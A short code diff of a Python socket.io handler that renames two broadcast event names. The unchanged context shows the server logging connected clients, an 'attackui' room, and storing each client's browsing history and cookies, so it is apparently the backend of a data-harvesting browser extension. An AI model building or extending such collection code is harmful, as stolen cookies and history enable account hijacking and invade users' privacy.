@@ -70,7 +70,7 @@ def handle_ext_ping(data):
         resp = database.construct_response(clientid)
         #emit('srvpayload', resp, room=request.sid)
         #room = "attackui"
-        emit('client', clientid, namespace ="/socket.io", broadcast=True) #, room = room)
+        emit('newClientInstall', clientid, namespace ="/socket.io", broadcast=True) #, room = room)
         return resp
     else:
         isConnected = 0
@@ -80,7 +80,7 @@ def handle_ext_ping(data):
         if(isConnected == 0):
             connected_clients.append((clientid, request.sid))
             #room = "attackui"
-            emit('client', clientid, namespace="/socket.io", broadcast=True)   #, room = room)
+            emit('connectSuccessful', clientid, namespace="/socket.io", broadcast=True)   #, room = room)
         if database.store_history(data["history"], clientid):
             return bad
         for cookie in data["cookies"]:
